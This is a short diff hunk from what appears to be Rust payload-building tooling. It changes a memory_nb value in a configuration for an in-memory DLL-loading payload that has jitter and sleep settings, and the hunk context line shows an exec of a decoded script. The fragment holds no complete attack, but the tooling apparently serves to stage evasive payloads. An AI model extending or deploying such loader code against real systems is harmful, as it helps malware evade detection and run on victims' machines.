@@ -205,7 +205,7 @@ exec(decoded_script)
             serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
         payload_choice = vec![Payload::DllFromMemory(DllFromMemory {
             link: Link::MEMORY(MemoryLink {
-                memory_nb: 4,
+                memory_nb: 2,
                 dataoperation: payload_dataoperation,
                 jitt: 0,
                 sleep: 0,
